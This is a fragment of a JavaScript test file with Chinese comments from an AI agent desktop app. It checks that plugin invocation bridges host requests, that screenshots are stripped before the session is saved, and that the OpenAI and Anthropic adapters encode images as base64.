  const invokeBody = src.slice(src.indexOf('async invoke('), src.indexOf('async toolDefinitions('))
  // 历史上 invoke 调 callPlugin 时不传 onRequest，面板里任何 api.readFile 都会挂死
  assert.ok(invokeBody.includes('handlePluginRequest'), 'invoke 应把宿主桥接进 callPlugin')
  assert.ok(invokeBody.includes('hooks.deps'), 'invoke 应接收并转交 deps')
})

/* ------------------------------------------------------------------ */
/* 视觉链路：截图不得落盘（隐私关键）                                    */
/* ------------------------------------------------------------------ */

test('截图只在一轮内使用，持久化前必须剔除 images', () => {
  const idx = readFileSync('src/main/index.ts', 'utf8')
  // save 之前必须先把 images 摘掉，否则截图会永久写进会话文件
  assert.ok(idx.includes('images: _images'), '主进程应在 sessionStore.save 前剥离 images')

  const runnerSrc = readFileSync('src/main/agent/runner.ts', 'utf8')
  // 截图累积在内存里，且有上限，避免长会话把内存撑爆
  assert.ok(runnerSrc.includes('pendingImages'), 'runner 应用 pendingImages 承载本轮截图')
  const cap = runnerSrc.match(/pendingImages\.length > (\d+)/)
  assert.ok(cap, 'pendingImages 必须有长度上限')
  assert.ok(Number(cap[1]) <= 5, `pendingImages 上限应较小，实际 ${cap[1]}`)
})

test('两家协议都能把图片编码进请求', () => {
  const openaiSrc = readFileSync('src/main/providers/openai.ts', 'utf8')
  const anthropicSrc = readFileSync('src/main/providers/anthropic.ts', 'utf8')
  // OpenAI 兼容：content parts + data URL
  assert.ok(openaiSrc.includes('image_url'), 'OpenAI 适配器应输出 image_url part')
  assert.ok(openaiSrc.includes('data:${img.mediaType};base64,'), 'OpenAI 应用 data URL 传图')
  // Anthropic：base64 source block
  assert.ok(anthropicSrc.includes("type: 'image'"), 'Anthropic 适配器应输出 image block')
  assert.ok(anthropicSrc.includes("type: 'base64'"), 'Anthropic 应用 base64 source')
  // 图片不能挂在 tool 消息上——两家协议的 tool 结果都不支持带图
  const runnerSrc = readFileSync('src/main/agent/runner.ts', 'utf8')
  assert.ok(runnerSrc.includes("m.role === 'tool'"), 'attachImages 应跳过 tool 消息')
})
